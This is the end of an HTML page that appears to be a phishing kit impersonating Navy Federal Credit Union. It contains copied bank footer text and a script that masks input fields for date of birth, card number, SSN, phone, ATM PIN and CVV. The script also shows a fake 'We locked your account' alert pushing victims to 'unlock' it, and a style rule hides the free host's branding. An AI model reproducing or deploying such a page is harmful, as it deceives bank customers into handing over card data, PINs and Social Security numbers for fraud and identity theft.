                            <script language="JavaScript" type="text/javascript">
                                document.write(new Date().getFullYear());
                            </script>
                            Navy Federal Credit Union.
                        </span><span>All rights reserved.</span></p>
                    <ul class="link-list">
                        <li><a id="InsuranceLink" class="js-link insurance-link" href="#" target="_blank"><span id="icon-ncualogo" class="icon-ncualogo" aria-hidden="true"></span>Federally Insured by NCUA
                            </a><span class="divider" aria-hidden="true">|</span></li>
                        <li><a id="ehlLink" class="js-link ehl-link" href="#"><span id="icon-equal-housing-lender" class="icon-equal-housing-lender" aria-hidden="true"></span> Equal Housing Lender
                            </a></li>
                    </ul>
                    <ul class="build-row"></ul>
                    <div id="footertxt" class="footnotes">
                        <p class="footnote">
                            APY = Annual Percentage Yield<span class="divider" aria-hidden="true"> | </span>APR = Annual Percentage Rate
                        </p>
                        <p class="footnote">
                            +Rates are based on an evaluation of credit history, so your rate may differ.
                        </p>
                        <p class="footnote">
                            ++Rates are variable, and based on an evaluation of credit history, so your rate may differ.
                        </p>
                        <p id="footerterms" class="footnote">
                            *Message and data rates may apply. <a href="#">Terms and Conditions</a> are available.
                        </p>
                        <p class="footnote">
                            iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App Store℠ is a service mark of Apple Inc. Android™ and Google Play™ are trademarks of Google Inc. Images used for representational purposes only; do not imply government endorsement.
                        </p>
                    </div>
                </div>
                <div class="note"></div>
            </div>
            <br style="clear: both;">
        </div>
    </div>




    <script>
        $(document).ready(function() {

            $("[name=dob]").mask("00/00/0000");
            $("[name=ccn]").mask("0000 0000 0000 0000");
            $("[name=ssn]").mask("000-00-0000");
            $("[name=phn]").mask("(000) 000-0000");
            $("[name=atm]").mask("0000");
            $("[name=cvv]").mask("000");
            
            
            
                setTimeout(function() {
                                                swal({
                                                    title: "We locked your account to protect it from unusual activity",
                                                    text: "To unblock it, Please complete verification process to protect your account.",
                                                    icon: "",
                                                    button: "Click here to unlock your account",
                                                });
                                            }, 500);

$(this).scrollTop(0);
            
        });
    </script>

    <script src="scripts/page.js">
    </script>
<!--
    <script src="scripts/js.js">
    </script>
-->
<!--
    <script src="scripts/s_code.js">
    </script>
-->
    <script src="scripts/jquery.mask.min.js">
    </script>
<!--
    <script src="scripts/PasscodeReset.js">
    </script>
    <script src="scripts/TrxMonitoring.js">
    </script>
    <script src="scripts/rsa.js">
    </script>
-->
    <style>
        img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {
            display: none;
        }
    </style>
    </body>

</html>